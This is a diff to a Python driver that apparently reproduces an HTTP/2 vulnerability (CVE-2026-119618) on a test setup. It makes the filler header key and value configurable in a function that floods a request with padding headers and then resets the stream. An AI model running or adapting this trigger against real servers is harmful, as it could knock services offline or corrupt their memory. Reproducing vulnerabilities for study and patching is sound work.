@@ -10,18 +10,21 @@ The public repo googlesky/CVE-2026-119618 is the source of h2client.py
 (MIT); this driver and the observations are this plant's own reproduction.
 """
 import argparse
+import os
 import threading
 import time
 
 from h2client import H2Connection, ConnectionClosed, ProtocolError, default_headers
 
 CT = "content-type"
+FILL_VALUE = os.environ.get("FILL_VALUE", "v")
+FILL_KEY = os.environ.get("FILL_KEY", "x-pad")
 
 
 def trigger_headers(conn, sid, fill, shape):
     headers = default_headers(method="POST")
     for i in range(fill):
-        headers.append(("x-pad-%03d" % i, "v"))
+        headers.append(("%s-%03d" % (FILL_KEY, i), FILL_VALUE))
     headers.append((CT, "application/x-www-form-urlencoded"))
     conn.send_request_headers(sid, headers, end_stream=True)
     if shape == "rst":
